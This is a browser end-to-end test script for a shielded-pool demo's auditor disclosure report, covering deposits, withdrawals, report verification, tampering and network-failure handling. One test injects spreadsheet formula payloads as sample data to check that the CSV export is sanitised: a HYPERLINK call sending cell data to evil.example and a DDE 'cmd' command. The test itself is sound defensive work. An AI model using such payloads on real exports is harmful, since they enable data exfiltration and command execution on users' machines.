// Browser end-to-end test of the disclosure report (docs/disclosure-v2-design.md, layers 1 and 1b): many notes in one
// file, checked by the auditor tab in one step, with or without the keys of notes that are already withdrawn.
// One local chain with the V7 native pools, the V7 router and the real disclosure verifier; real Groth16 proofs.
// Needs the same setup as router-e2e.js (see README.md).
//   DEMO=/path/to/demo node disclosure-e2e.js
const fs = require('fs'), path = require('path');
const { cspFor } = require('../../tools/make-headers.js');   // pages are served with the CSP of site/_headers
const NM = path.resolve(__dirname, '..', 'distribution', 'node_modules');
const req = (m) => require(path.join(NM, m));
const solc = req('solc'), ganache = req('ganache'), { ethers } = req('ethers');
let chromium; try { ({ chromium } = require('playwright')); } catch (e) { ({ chromium } = require(process.env.PLAYWRIGHT_PATH || '/usr/lib/node_modules/playwright')); }
const REPO = path.resolve(__dirname, '..', '..');
if (!process.env.DEMO) { console.log('Set DEMO to the folder that holds index.html'); process.exit(2); }
const DEMO = process.env.DEMO;
const SHOTS = process.env.SHOTS || path.join(require('os').tmpdir(), 'latheon-demo-shots'); fs.mkdirSync(SHOTS, { recursive: true });
const rd = (p) => fs.readFileSync(p, 'utf8');
const say = (...a) => console.log(...a);
const sources = {
  'contracts/PoseidonT3.sol': { content: rd(REPO + '/contracts/PoseidonT3.sol') },
  'contracts/V7N.sol': { content: rd(REPO + '/contracts/LatheonShieldedPoolV7Native.sol') },
  'contracts/Dist7N.sol': { content: rd(REPO + '/contracts/LatheonDistributionPoolV7Native.sol') },
  'contracts/VerifierV5c.sol': { content: rd(REPO + '/contracts/WithdrawVerifierV5.sol') },
  'contracts/VerifierDisclose.sol': { content: rd(REPO + '/contracts/DiscloseVerifier.sol') },
};
const imp = (p) => { const f = path.join(NM, p); return fs.existsSync(f) ? { contents: rd(f) } : { error: 'nf ' + p }; };
say('Compiling…');
const out = JSON.parse(solc.compile(JSON.stringify({ language: 'Solidity', sources, settings: { optimizer: { enabled: true, runs: 200 }, evmVersion: 'paris', outputSelection: { '*': { '*': ['abi', 'evm.bytecode.object', 'evm.bytecode.linkReferences'] } } } }), { import: imp }));
if ((out.errors || []).some((e) => e.severity === 'error')) { say(out.errors.filter((e) => e.severity === 'error').map((e) => e.formattedMessage).join('\n')); process.exit(1); }
const K = (f, n) => out.contracts['contracts/' + f][n];
const C = { Poseidon: K('PoseidonT3.sol', 'PoseidonT3'), Pool7N: K('V7N.sol', 'LatheonShieldedPoolV7Native'), Dist7N: K('Dist7N.sol', 'LatheonDistributionPoolV7Native'),
  Ver5c: K('VerifierV5c.sol', 'WithdrawVerifierV5'), VerD: K('VerifierDisclose.sol', 'Groth16Verifier') };
const linked = (c, libs) => { let code = c.evm.bytecode.object; const refs = c.evm.bytecode.linkReferences; for (const f in refs) for (const l in refs[f]) for (const { start, length } of refs[f][l]) code = code.slice(0, start * 2) + libs[l].slice(2).toLowerCase() + code.slice(start * 2 + length * 2); return code; };
const N = 'latheon-testnet', CHAIN = { id: 60531373273, hex: '0xe17f374d9' }, E18 = 10n ** 18n;

(async () => {
  const results = []; const rec = (n, ok, note) => { results.push([n, ok]); say((ok ? 'PASS ' : 'FAIL ') + n + (note ? '   [' + note + ']' : '')); };
  let browser, page; const consoleMsgs = [], pageErrors = [];
  try {
    const provider = ganache.provider({ logging: { quiet: true }, chain: { chainId: CHAIN.id, networkId: CHAIN.id, hardfork: 'shanghai' }, wallet: { deterministic: true, defaultBalance: 100000 }, miner: { blockGasLimit: 60000000 } });
    const eth = new ethers.BrowserProvider(provider);
    const accounts = await provider.request({ method: 'eth_accounts', params: [] });
    const fresh = (i) => ethers.getAddress(ethers.dataSlice(ethers.keccak256(ethers.toUtf8Bytes('disclosure-e2e-recipient-' + i)), 12));
    const s = await eth.getSigner(0);
    const d = async (c, args = [], libs = {}) => { const f = new ethers.ContractFactory(c.abi, '0x' + linked(c, libs), s); const x = await f.deploy(...args); const rc = await x.deploymentTransaction().wait(); return { c: x, addr: await x.getAddress(), block: rc.blockNumber }; };
    const lib = await d(C.Poseidon), libs = { PoseidonT3: lib.addr };
    const ver = await d(C.Ver5c), verD = await d(C.VerD);
    const pools = {}, ps = [];
    for (const a of [100, 50, 10, 1]) { const p = await d(C.Pool7N, [ver.addr, BigInt(a) * E18], libs); pools[a] = p; ps.push(p.addr); }
    const router = await d(C.Dist7N, [ps]);
    say('  V7 pools, router and the disclosure verifier deployed');
    const cfg = { schema: 1, generated: 'test', pools: [], routers: [], networks: { [N]: {
      name: 'Latheon Testnet', chainId: CHAIN.id, chainIdHex: CHAIN.hex, rpcUrl: 'https://rpc.latheon-testnet.test', explorerUrl: 'https://explorer.latheon-testnet.test',
      v5Verifier: ver.addr, v7Verifier: ver.addr, discloseVerifier: verD.addr, nativeCurrency: { name: 'LTH (test)', symbol: 'LTH', decimals: 18 },
      tokens: { LTH: { address: ethers.ZeroAddress, decimals: 18, native: true } } } } };
    for (const a of [100, 50, 10, 1]) cfg.pools.push({ id: N + ':LTH-' + a, network: N, version: 'v7-native', token: 'LTH', amount: a, address: pools[a].addr, deployBlock: pools[a].block });
    cfg.routers.push({ id: N + ':LTH', network: N, token: 'LTH', native: true, version: 'v7', address: router.addr, deployBlock: router.block });
    const cfgJson = JSON.stringify(cfg);
    // Network failures on demand: a predicate over one JSON-RPC call; matching requests get HTTP 503.
    let failMode = null;
    const callTo = (addrs) => (q) => q.method === 'eth_call' && q.params && q.params[0] && addrs.includes(String(q.params[0].to).toLowerCase());
    const NULLIFIER_SEL = ethers.id('nullifierHashes(uint256)').slice(0, 10);
    const WD_TOPIC = ethers.id('Withdrawal(address,uint256,address,uint256,uint256)');

    browser = await chromium.launch();
    const ctx = await browser.newContext({ viewport: { width: 1280, height: 1000 }, acceptDownloads: true });
    page = await ctx.newPage();
    page.on('console', (m) => consoleMsgs.push(m.type() + ': ' + m.text().slice(0, 300)));
    page.on('pageerror', (e) => pageErrors.push(e.message));
    await page.exposeFunction('__rpc', async (method, paramsJson) => {
      const params = JSON.parse(paramsJson || '[]');
      try {
        if (method === 'eth_requestAccounts' || method === 'eth_accounts') return JSON.stringify({ result: [accounts[0]] });
        if (method === 'eth_chainId') return JSON.stringify({ result: CHAIN.hex });
        if (method === 'net_version') return JSON.stringify({ result: String(CHAIN.id) });
        if (method === 'wallet_switchEthereumChain' || method === 'wallet_addEthereumChain') return JSON.stringify({ result: null });
        return JSON.stringify({ result: await provider.request({ method, params }) });
      } catch (e) { return JSON.stringify({ error: { code: e.code || -32000, message: e.message || String(e) } }); }
    });
    await page.addInitScript(() => { window.ethereum = { isMetaMask: true, request: async ({ method, params }) => { const r = JSON.parse(await window.__rpc(method, JSON.stringify(params || []))); if (r.error) { const e = new Error(r.error.message); e.code = r.error.code; throw e; } return r.result; }, on() {}, removeListener() {} }; });
    const B = REPO + '/circuits/build';
    const FILES = {
      'https://cdn.jsdelivr.net/gh/latheon-network/latheon@main/circuits/build/withdraw_v5/withdraw_v5.wasm': B + '/withdraw_v5/withdraw_v5.wasm',
      'https://cdn.jsdelivr.net/gh/latheon-network/latheon@main/circuits/build/withdraw_v5/withdraw_v5_final.zkey': B + '/withdraw_v5/withdraw_v5_final.zkey',
      'https://cdn.jsdelivr.net/gh/latheon-network/latheon@main/circuits/build/withdraw_v3/withdraw_v3.wasm': B + '/withdraw_v3/withdraw_v3.wasm',
      'https://cdn.jsdelivr.net/gh/latheon-network/latheon@main/circuits/build/withdraw_v3/withdraw_v3_final.zkey': B + '/withdraw_v3/withdraw_v3_final.zkey',
      'https://cdn.jsdelivr.net/gh/latheon-network/latheon@main/circuits/build/disclose/disclose.wasm': B + '/disclose/disclose.wasm',
      'https://cdn.jsdelivr.net/gh/latheon-network/latheon@main/circuits/build/disclose/disclose_final.zkey': B + '/disclose/disclose_final.zkey',
    };
    const cors = { 'access-control-allow-origin': '*' };
    const routeAll = async (route) => {
      const url = route.request().url();
      if (url === 'https://latheon.test/demo/') { const html = rd(DEMO + '/index.html'); return route.fulfill({ status: 200, contentType: 'text/html', headers: { 'content-security-policy': cspFor(html, cfg) }, body: html }); }
      if (url.startsWith('https://latheon.test/demo/vendor/')) return route.fulfill({ status: 200, contentType: 'application/javascript', body: rd(DEMO + '/vendor/' + url.split('/').pop()) });
      if (url === 'https://latheon.test/demo/deployments.json') return route.fulfill({ status: 200, contentType: 'application/json', body: cfgJson });
      const fk = url.replace(/latheon@[0-9a-f]{40}\//, 'latheon@main/');   // the demo pins circuits to a commit
      if (FILES[fk]) return route.fulfill({ status: 200, contentType: 'application/octet-stream', headers: cors, body: fs.readFileSync(FILES[fk]) });
      if (url.startsWith(cfg.networks[N].rpcUrl)) {
        const h = { 'access-control-allow-origin': '*', 'access-control-allow-headers': '*', 'access-control-allow-methods': 'POST, OPTIONS' };
        if (route.request().method() === 'OPTIONS') return route.fulfill({ status: 204, headers: h });
        const body = JSON.parse(route.request().postData() || '{}');
        if (failMode && (Array.isArray(body) ? body : [body]).some(failMode)) return route.fulfill({ status: 503, headers: h, body: 'unavailable (test)' });
        const one = async (q) => { try { return { jsonrpc: '2.0', id: q.id, result: await provider.request({ method: q.method, params: q.params }) }; } catch (e) { return { jsonrpc: '2.0', id: q.id, error: { code: e.code || -32000, message: e.message } }; } };
        const outp = Array.isArray(body) ? await Promise.all(body.map(one)) : await one(body);
        return route.fulfill({ status: 200, contentType: 'application/json', headers: h, body: JSON.stringify(outp) });
      }
      return route.abort();
    };
    await page.route('**/*', routeAll);
    const waitText = (pg, sel, re, ms = 300000) => pg.waitForFunction(([q, r]) => new RegExp(r).test((document.querySelector(q) || {}).textContent || ''), [sel, re.source], { timeout: ms });

    await page.goto('https://latheon.test/demo/');
    await waitText(page, '#poolInfo', /contract 0x/, 60000);
    await page.click('#connectBtn'); await waitText(page, '#walletStatus', /Connected to/, 60000);

    // ---- deposits: a router deposit of 161 (4 notes, one master key) and two fixed-pool notes (10 and 50)
    await page.click('#tab-deposit'); await page.click('#depMode-any');
    if (await page.locator('#keySavedChk').count()) { const c = page.locator('#keySavedChk'); if (!(await c.isChecked())) await c.check(); }
    await page.fill('#daAmount', '161'); await page.check('input[name="daRound"][value="exact"]'); await page.waitForTimeout(200);
    await page.click('#daDepositBtn');
    await page.waitForFunction(() => { const e = document.getElementById('masterText'); return e && e.textContent.trim(); }, null, { timeout: 240000 });
    const key = (await page.textContent('#masterText')).trim();
    if (await page.locator('#keySavedChk').count() && !(await page.isChecked('#keySavedChk'))) await page.check('#keySavedChk');
    const fixedNote = async (amount, prev) => {
      await page.click('#depMode-fixed');
      if (await page.locator('#noteSavedChk').count() && !(await page.isChecked('#noteSavedChk'))) await page.check('#noteSavedChk');
      await page.selectOption('#poolSelect', N + ':LTH-' + amount); await page.waitForTimeout(300);
      await page.click('#depositBtn');
      await page.waitForFunction((o) => { const e = document.getElementById('noteText'); return e && e.textContent.trim() && e.textContent.trim() !== o; }, prev || '', { timeout: 240000 });
      return (await page.textContent('#noteText')).trim();
    };
    const noteA = await fixedNote(10), noteB = await fixedNote(50, noteA);
    rec('D1. Deposits made: router 161 (master key) and fixed notes of 10 and 50', key.startsWith('latheon-master:' + CHAIN.id + ':') && noteA.startsWith('latheon-v5:') && noteB.startsWith('latheon-v5:') && noteA !== noteB, key.slice(0, 40) + '…');

    // ---- withdrawals from the wallet: note A to r1; 61 of the router's 161 (50 + 10 + 1) to r2; 100 and note B stay unspent
    const r1 = fresh(1), r2 = fresh(2);
    await page.click('#tab-withdraw'); await page.click('#wdMode-one');
    if (await page.locator('#useRelay').count() && await page.isVisible('#useRelay')) await page.uncheck('#useRelay');
    await page.fill('#noteInput', noteA); await page.fill('#recipientInput', r1); await page.click('#withdrawBtn');
    await waitText(page, '#withdrawStatus', /Withdrawal successful|Failed/);
    await page.click('#wdMode-any');
    if (await page.locator('#waUseRelay').count() && await page.isVisible('#waUseRelay')) await page.uncheck('#waUseRelay');
    await page.fill('#waKey', key); await page.fill('#waAmount', '61'); await page.fill('#waRecipient', r2);
    await page.click('#waFindBtn'); await page.waitForFunction(() => !document.getElementById('waFindBtn').disabled, null, { timeout: 120000 });
    await page.click('#waGoBtn'); await waitText(page, '#waStatus', /Withdrawn|Failed/, 600000);
    rec('D2. Withdrawn: note A (10) to r1 and 61 of the router deposit to r2', (await eth.getBalance(r1)) === 10n * E18 && (await eth.getBalance(r2)) === 61n * E18, (await page.textContent('#waStatus')).trim().slice(0, 60));

    // ---- the auditor (another tab, no wallet) issues a code
    const aud = await ctx.newPage(); const audErrors = []; aud.on('pageerror', (e) => audErrors.push(e.message));
    await aud.route('**/*', routeAll);
    await aud.goto('https://latheon.test/demo/'); await aud.waitForFunction(() => /contract 0x/.test(document.getElementById('poolInfo').textContent), null, { timeout: 60000 });
    await aud.click('#tab-auditor'); await aud.click('#genNonceBtn');
    const code = (await aud.textContent('#nonceOut')).trim();

    // ---- report with the keys of withdrawn notes
    const buildReport = async (lines, codeText, withKeys) => {
      await page.click('#tab-disclose');
      await page.fill('#reportInput', lines.join('\n')); await page.fill('#reportNonceInput', codeText);
      if (withKeys) await page.check('#reportKeys'); else await page.uncheck('#reportKeys');
      await page.evaluate(() => { document.getElementById('reportStatus').textContent = ''; window.__latheonLastReport = null; });
      await page.click('#reportBtn'); await waitText(page, '#reportStatus', /Report ready|Failed/, 600000);
      return { status: (await page.textContent('#reportStatus')).trim(), text: await page.evaluate(() => window.__latheonLastReport) };
    };
    const warnShown = async () => { await page.click('#tab-disclose'); await page.check('#reportKeys'); const v = await page.isVisible('#reportKeysWarn'); await page.uncheck('#reportKeys'); return v && !(await page.isVisible('#reportKeysWarn')); };
    rec('D3. Ticking "also show where withdrawn notes went" shows the warning; unticking hides it', await warnShown(), '');
    const t0 = Date.now();
    const r = await buildReport([key, noteA, noteB], code, true);
    // REPORT_OUT=<file>: keep this report (made by the demo, with keys of the withdrawn notes) as a test vector of the file
    // format; sdk/test/report.js checks it with the SDK's verifier (test/vectors/disclosure-report/demo-built-v1.json).
    if (process.env.REPORT_OUT && r.text) fs.writeFileSync(process.env.REPORT_OUT, r.text + '\n');
    const rep = r.text ? JSON.parse(r.text) : { items: [] };
    const withKeys = rep.items.filter((x) => x.keys), unspent = rep.items.filter((x) => !x.withdrawn);
    rec('D4. Report of a master key and two notes: 6 notes, 221 LTH, proofs for the auditor\'s code', /Report ready: 6 notes, 221 LTH/.test(r.status) && rep.items.length === 6 && rep.auditorNonce === code && rep.items.every((x) => x.proof && BigInt(x.proof.pubSignals[2]) === BigInt(code)),
      r.status.slice(0, 90) + ' · ' + ((Date.now() - t0) / 1000).toFixed(1) + ' s');
    rec('D5. Keys only for the 4 withdrawn notes; none for the 2 unspent ones (100 and note B)', withKeys.length === 4 && withKeys.every((x) => x.withdrawn) && unspent.length === 2 && unspent.every((x) => !x.keys) && unspent.map((x) => x.amount).sort().join() === '100,50',
      'keys ' + withKeys.map((x) => x.amount).join('+') + ', unspent ' + unspent.map((x) => x.amount).join('+'));

    // ---- the auditor verifies the report in one step
    const verify = async (text) => {
      await aud.click('#tab-auditor'); await aud.fill('#auditBlockInput', text);
      await aud.evaluate(() => { document.getElementById('auditStatus').textContent = ''; window.__latheonLastCsv = null; });
      await aud.click('#auditVerifyBtn'); await aud.waitForFunction(() => /\S/.test(document.getElementById('auditStatus').textContent), null, { timeout: 300000 });
      return { status: (await aud.textContent('#auditStatus')).trim(), rows: await aud.$$eval('#auditReport table.rep tbody tr', (trs) => trs.map((tr) => [...tr.children].map((td) => td.textContent.trim()))), csv: await aud.evaluate(() => window.__latheonLastCsv) };
    };
    const v1 = await verify(r.text);
    rec('D6. Auditor: every note valid, made for the issued code and found on chain', /Every note in the report is valid/.test(v1.status) && v1.rows.length === 6 && v1.rows.every((c) => c[4] === '✓' && c[5] === '✓' && c[6] === '✓'), v1.status.slice(0, 80));
    const rcol = v1.rows.map((c) => c[8]), short = (a) => a.slice(0, 6) + '…' + a.slice(-4);
    rec('D7. Where the withdrawn notes went: r1 once, r2 three times; the unspent notes show no recipient', rcol.filter((x) => x === short(r1)).length === 1 && rcol.filter((x) => x === short(r2)).length === 3 && rcol.filter((x) => x === '—').length === 2, rcol.join(' '));
    rec('D8. CSV for accounting: 6 rows, recipients, withdrawal transactions', !!v1.csv && v1.csv.trim().split('\n').length === 7 && v1.csv.includes(r1) && v1.csv.includes(r2) && /^n,network,pool,generation,pool_frozen,token,amount,commitment/.test(v1.csv), v1.csv ? v1.csv.split('\n')[1].slice(0, 80) : 'no csv');

    await aud.screenshot({ path: SHOTS + '/disclosure-report-table.png', fullPage: true });
    await page.click('#tab-disclose'); await page.screenshot({ path: SHOTS + '/disclosure-report-built.png', fullPage: true });
    // ---- the same notes without keys: proofs only, no recipients
    const rNo = await buildReport([key, noteA, noteB], code, false);
    const repNo = rNo.text ? JSON.parse(rNo.text) : { items: [] };
    const v2 = await verify(rNo.text);
    rec('D9. Without the option: no keys in the file, the auditor sees ownership but no recipients', repNo.items.length === 6 && !repNo.items.some((x) => x.keys) && !/spendKey/.test(rNo.text) && /Every note in the report is valid/.test(v2.status) && v2.rows.every((c) => c[8] === '—'), v2.status.slice(0, 60));

    // ---- tampering
    const bad = JSON.parse(r.text); bad.items[0].proof.pubSignals[2] = '12345';
    const v3 = await verify(JSON.stringify(bad));
    rec('D10. A proof edited to another code fails (✗) and the report is not accepted', /did not pass/.test(v3.status) && v3.rows[0][4] === '✗', v3.rows[0].slice(4, 7).join(' '));
    const swap = JSON.parse(r.text); const ki = swap.items.findIndex((x) => x.keys), kj = swap.items.findIndex((x, i) => x.keys && i !== ki);
    [swap.items[ki].keys, swap.items[kj].keys] = [swap.items[kj].keys, swap.items[ki].keys];
    const v4 = await verify(JSON.stringify(swap));
    rec('D11. Keys swapped between two notes are caught ("keys do not match"), no recipient shown, report not accepted', v4.rows[ki][7] === 'keys do not match' && v4.rows[kj][7] === 'keys do not match' && v4.rows[ki][8] === '—' && /did not pass/.test(v4.status), v4.rows[ki][7] + ' · ' + v4.status.slice(0, 40));
    const otherCode = await buildReport([noteB], '999', false);
    const v5 = await verify(otherCode.text);
    rec('D12. A report made for another code: valid proofs, but the code column fails and the report is not accepted', /did not pass/.test(v5.status) && v5.rows[0][4] === '✓' && v5.rows[0][5] === '✗', v5.rows[0].slice(4, 7).join(' '));
    const plainKey = await buildReport(['not a note'], code, false);
    rec('D13. A line that is neither a note nor a master key is refused with its line number', /Line 1:/.test(plainKey.status), plainKey.status.slice(0, 80));

    // ---- the old single-proof flow still works next to the report
    await page.click('#tab-disclose'); await page.fill('#discloseNoteInput', noteB); await page.fill('#auditorNonceInput', code);
    await page.evaluate(() => { document.getElementById('discloseStatus').textContent = ''; });
    await page.click('#discloseBtn'); await waitText(page, '#discloseStatus', /verified|Failed|did not verify/);
    const single = await page.inputValue('#discloseBlock').catch(() => '');
    await aud.click('#tab-auditor'); await aud.fill('#auditBlockInput', single);
    await aud.evaluate(() => { document.getElementById('auditStatus').textContent = ''; });
    await aud.click('#auditVerifyBtn'); await aud.waitForFunction(() => /\S/.test(document.getElementById('auditStatus').textContent), null, { timeout: 300000 });
    rec('D14. The single-note disclosure still verifies in the auditor tab; no report table is left over', /verified|valid|accept/i.test(await aud.textContent('#auditStatus')) && (await aud.$$('#auditReport table')).length === 0, (await aud.textContent('#auditStatus')).trim().slice(0, 60));

    // ---- fixes after the internal review of 1-2 November 2026
    const totalLine = async () => (await aud.textContent('#auditReport p.muted')).trim();
    const dupRep = JSON.parse(r.text); for (let i = 0; i < 3; i++) dupRep.items.push(JSON.parse(JSON.stringify(dupRep.items[0])));
    const v6 = await verify(JSON.stringify(dupRep)), t6 = await totalLine();
    rec('D18. A note repeated in the report: repeats marked, not counted, report refused', /repeats a note/.test(v6.status) && v6.rows.slice(6).every((c) => c[7] === 'repeat' && c[6] === '✗') && /Valid notes: 6 of 9/.test(t6) && /221 LTH/.test(t6), t6.slice(0, 70));
    await aud.screenshot({ path: SHOTS + '/disclosure-report-repeat.png', fullPage: true });
    const inj = JSON.parse(rNo.text); inj.items.push(Object.assign(JSON.parse(JSON.stringify(inj.items[0])), { pool: '=HYPERLINK("https://evil.example/?x="&A1,"click")', commitment: "=cmd|' /C calc'!A0" }));
    const v7 = await verify(JSON.stringify(inj));
    const cells = (v7.csv || '').split('\n').flatMap((l) => l.split(',')).map((c) => c.replace(/^"/, ''));
    rec('D19. CSV: nothing from the report that a spreadsheet would run as a formula; the bad row is refused (it copies a proof, so it is also a repeat)', !!v7.csv && !cells.some((c) => /^[=+@]/.test(c)) && !/HYPERLINK|cmd\|/.test(v7.csv) && /did not pass|repeats a note/.test(v7.status), v7.csv ? v7.csv.trim().split('\n').pop().slice(0, 80) : 'no csv');
    failMode = callTo([verD.addr.toLowerCase()]);
    const v8 = await verify(r.text);
    const retryBtn = (await aud.$$('#auditRetryBtn')).length;
    failMode = null;
    let v8b = '';
    if (retryBtn) { await aud.evaluate(() => { document.getElementById('auditStatus').textContent = ''; }); await aud.click('#auditRetryBtn'); await aud.waitForFunction(() => /\S/.test(document.getElementById('auditStatus').textContent), null, { timeout: 300000 }); v8b = (await aud.textContent('#auditStatus')).trim(); }
    rec('D20. Verifier unreachable: proofs marked ?, "not a verdict", a retry button; the retry then passes', /could not be made/.test(v8.status) && v8.rows.every((c) => c[4] === '?') && retryBtn === 1 && /Every note in the report is valid/.test(v8b), v8.status.slice(0, 50) + ' → ' + v8b.slice(0, 40));
    failMode = (q) => q.method === 'eth_call' && q.params && q.params[0] && String(q.params[0].data || q.params[0].input || '').startsWith(NULLIFIER_SEL);
    const v9 = await verify(r.text);
    failMode = null;
    const keyedRows = v9.rows.filter((c) => c[7] === 'could not check (network)');
    rec('D21. Nullifier check unreachable: keyed rows say "could not check (network)", never "keys do not match"; status is not a pass', keyedRows.length === 4 && !v9.rows.some((c) => c[7] === 'keys do not match') && /could not be made/.test(v9.status), v9.status.slice(0, 50));
    const alt = JSON.parse(rNo.text); alt.verifierAddress = fresh(9);
    const v10 = await verify(JSON.stringify(alt)), warnText = await aud.$$eval('#auditReport .status.warn', (els) => els.map((e) => e.textContent).join(' | '));
    rec('D22. A report naming another verifier: checked with the official one, and a warning names the other address', /Every note in the report is valid/.test(v10.status) && warnText.includes('different verifier') && warnText.includes(fresh(9)), warnText.slice(0, 80));
    // a deposit made after both tabs were used: still found by the user and by the auditor without reloading
    await page.click('#tab-deposit');
    const noteC = await fixedNote(1, noteB);
    const rC = await buildReport([noteC], code, false);
    const vC = rC.text ? await verify(rC.text) : { status: '' };
    rec('D23. A deposit made after earlier reports: found in a new report and by the auditor tab without reloading', /Report ready: 1 notes?, 1 LTH/.test(rC.status) && /Every note in the report is valid/.test(vC.status), rC.status.slice(0, 40) + ' · ' + vC.status.slice(0, 40));
    // 1b: keys only when two signals agree. "Spent or not" comes from the Withdrawal events (never from a question about
    // one note), so without them there is no report at all; the nullifier flag is the second signal for the keys.
    failMode = (q) => q.method === 'eth_getLogs' && q.params && q.params[0] && JSON.stringify(q.params[0].topics || []).toLowerCase().includes(WD_TOPIC.toLowerCase());
    let flagAsked = 0; const countFlag = (q) => { if (q.method === 'eth_call' && q.params && q.params[0] && String(q.params[0].data || q.params[0].input || '').startsWith(NULLIFIER_SEL)) flagAsked++; return false; };
    const failWd = failMode; failMode = (q) => countFlag(q) || failWd(q);
    const rK = await buildReport([key, noteA, noteB], code, true);
    failMode = null;
    rec('D24. Withdrawal events unreachable while building: no report and no keys, the failure is shown, and no single nullifier was asked instead', !rK.text && /Failed/.test(rK.status) && flagAsked === 0, rK.status.slice(-90) + ' · flag reads ' + flagAsked);
    failMode = (q) => q.method === 'eth_call' && q.params && q.params[0] && String(q.params[0].data || q.params[0].input || '').startsWith(NULLIFIER_SEL);
    const rK2 = await buildReport([key, noteA, noteB], code, true);
    failMode = null;
    const repK2 = rK2.text ? JSON.parse(rK2.text) : { items: [] };
    rec('D24b. Nullifier flag unreachable while building: the report is made, no keys added, the user is told why', repK2.items.length === 6 && !repK2.items.some((x) => x.keys) && /Keys not added for 4/.test(rK2.status), rK2.status.slice(-90));

    // a payout (Payouts tab, from the wallet), then the accountant's report from the payout file pasted as is
    const q1 = fresh(31), q2 = fresh(32);
    await page.click('#tab-payout'); await page.fill('#poInput', q1 + ', 111\n' + q2 + ', 23');
    await page.click('#poPlanBtn'); await page.waitForTimeout(300); await page.click('#poDepositBtn');
    await waitText(page, '#poStatus', /deposits made|failed/, 600000);
    const payoutText = await page.evaluate(() => window.__latheonLastPayout) || '';
    await page.check('#poRecSaved');
    if (await page.locator('#poUseRelay').count() && await page.isVisible('#poUseRelay')) await page.uncheck('#poUseRelay');
    await page.click('#poPayBtn'); await waitText(page, '#poPayStatus', /Done:|stopped/, 900000);
    const paidQ = (await eth.getBalance(q1)) === 111n * E18 && (await eth.getBalance(q2)) === 23n * E18;
    const rQ = await buildReport([payoutText], code, true);
    const vQ = rQ.text ? await verify(rQ.text) : { status: '', rows: [] };
    const sQ = (a) => a.slice(0, 6) + '…' + a.slice(-4), colQ = vQ.rows.map((c) => c[8]);
    rec('D26. Payout to two recipients from the wallet (111, 23 LTH), then the report from the payout file pasted as is: 8 notes valid, each recipient with exactly its own notes, labelled as the payout',
      paidQ && /Report ready: 8 notes, 134 LTH/.test(rQ.status) && /Every note in the report is valid/.test(vQ.status) && vQ.rows.length === 8 &&
      colQ.filter((x) => x === sQ(q1)).length === 3 && colQ.filter((x) => x === sQ(q2)).length === 5 && vQ.rows.every((c) => c[11] === 'payout to 2 recipients'),
      rQ.status.slice(0, 50) + ' · ' + vQ.rows.length + ' rows');

    // labels after "#": the user's own text, carried into the report and shown to the auditor as not proven
    const rL = await buildReport([key + ' # Project A, Q4', noteA + ' #=HYPERLINK("x")\u0007', noteB], code, false);
    const repL = rL.text ? JSON.parse(rL.text) : { items: [] };
    const vL = rL.text ? await verify(rL.text) : { rows: [], csv: '' };
    const byLabel = rL.text ? (await aud.$$eval('#auditReport p.muted', (els) => els.map((e) => e.textContent).join(' | '))) : '';
    const csvLast = (vL.csv || '').trim().split('\n').map((l) => l.split(',').pop());
    rec('D25. Labels: the 4 notes of the master key carry "Project A, Q4", note B none; the auditor sees a Label column, totals by label and a "not proven" note; CSV label column quoted against formulas',
      repL.items.length === 6 && repL.items.filter((x) => x.label === 'Project A, Q4').length === 4 && repL.items.filter((x) => !x.label).length === 1 &&
      vL.rows.filter((c) => c[11] === 'Project A, Q4').length === 4 && /Project A, Q4: 161 LTH/.test(byLabel) && (await aud.textContent('#auditReport')).includes('not proven') &&
      csvLast[0] === 'label_user_stated' && !csvLast.some((c) => /^"?[=+@]/.test(c)) && !/\u0007/.test(vL.csv || ''),
      byLabel.slice(0, 90));

    await page.selectOption('#langSelect', 'ru'); await page.click('#tab-disclose'); await page.waitForTimeout(300);
    const ruH = (await page.textContent('#reportBlock h4')).trim();
    rec('D15. Russian text for the report block', /Отчёт для бухгалтера/.test(ruH), ruH);
    await page.screenshot({ path: SHOTS + '/disclosure-report-ru.png', fullPage: true });
    await page.selectOption('#langSelect', 'en');
    await aud.screenshot({ path: SHOTS + '/disclosure-report-auditor.png', fullPage: true });
    const raw = await page.evaluate(() => [...document.querySelectorAll('[data-i18n]')].filter((e) => e.getAttribute('data-i18n') === e.textContent.trim()).map((e) => e.getAttribute('data-i18n')));
    rec('D16. Every data-i18n element has a translation (no raw keys)', raw.length === 0, raw.join(','));
    rec('D17. No JavaScript errors on either page', pageErrors.length === 0 && audErrors.length === 0, pageErrors.concat(audErrors).slice(0, 2).join(' | '));
  } catch (e) {
    say('TEST ERROR:', e && e.stack ? e.stack.split('\n').slice(0, 4).join('\n') : e);
    try { say('--- console tail ---'); consoleMsgs.slice(-12).forEach((m) => say('  ' + m)); say('--- pageErrors: ' + pageErrors.join(' | ')); if (page) { say('--- log tail: ' + (await page.textContent('#log')).slice(-800)); await page.screenshot({ path: SHOTS + '/disclosure-fail.png' }); } } catch (e2) {}
    rec('Test aborted', false, String(e && e.message).slice(0, 150));
  } finally {
    say('\nSUMMARY: ' + results.filter((r) => r[1]).length + '/' + results.length + ' passed' + (results.every((r) => r[1]) ? ' - ALL OK' : ' - FAILURES'));
    say('E2E_DONE');
    if (browser) await browser.close();
    process.exit(0);
  }
})();
